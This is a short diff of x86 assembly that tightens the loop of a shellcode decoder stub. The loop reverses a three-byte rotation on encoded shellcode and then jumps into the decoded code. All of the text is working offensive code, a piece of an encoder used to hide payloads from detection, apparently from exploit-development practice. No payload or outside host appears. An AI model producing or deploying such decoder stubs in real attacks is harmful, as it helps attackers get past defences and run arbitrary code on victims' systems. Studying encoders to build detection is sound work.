@@ -19,14 +19,10 @@ decode:
     ; esi = starting shellcode addr
     ; eax = current byte pointer, incremented by 3 each time
     mov     bl, byte [eax]              ; bl = C
-    mov     dl, byte [eax + 1]          ; dl = A
-    xchg    byte [eax ], dl             ; [ A A B ] 
-    mov     dl, byte [eax + 2]          ; dl = B
-    xchg    byte [eax + 1], dl          ; [ A B B ]
-    xchg    byte [eax + 2], bl          ; [ A B C ]
-    inc     eax
-    inc     eax
-    inc     eax
+    xchg    byte [eax + 2], bl          ; [ C A C ] , bl = B
+    xchg    byte [eax + 1], bl          ; [ C B C ] , bl = A
+    xchg    byte [eax], bl              ; [ A B C ]
+    add     al, 0x3                     
     loop    decode
     jmp     esi
     
